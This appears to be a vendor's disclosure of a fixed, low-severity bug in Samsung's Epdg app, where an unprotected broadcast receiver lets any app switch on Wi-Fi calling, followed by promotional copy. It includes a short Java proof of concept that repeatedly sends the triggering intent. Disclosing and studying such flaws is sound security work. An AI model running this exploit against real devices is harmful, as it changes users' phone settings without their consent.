# Details

<table>
    <tr>
        <td>Name</td>
        <td>Epdg</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.sec.epdg</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.20</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.01.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$270</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

Oversecured found an unprotected dynamically registered reviser in the Epdg app in the `com/sec/epdg/IntentReceiver.java` file. When processing the intent, in case of the `com.sec.commands.ipcall.action_ip_setting_change` action it sets the state of Wi-Fi calls turned on from the parameter `com.sec.commands.ipcall.state` received from the attacker.

**Proof of Concept**

Enabling Wi-Fi calls:
```java
new Thread(() -> {
    Intent i = new Intent("com.sec.commands.ipcall.action_ip_setting_change");
    i.putExtra("com.sec.commands.ipcall.setting", 2);
    i.putExtra("com.sec.commands.ipcall.state", 1);
    while (true) {
        sendBroadcast(i);
        try {
            Thread.sleep(100);
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}).start();
```

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.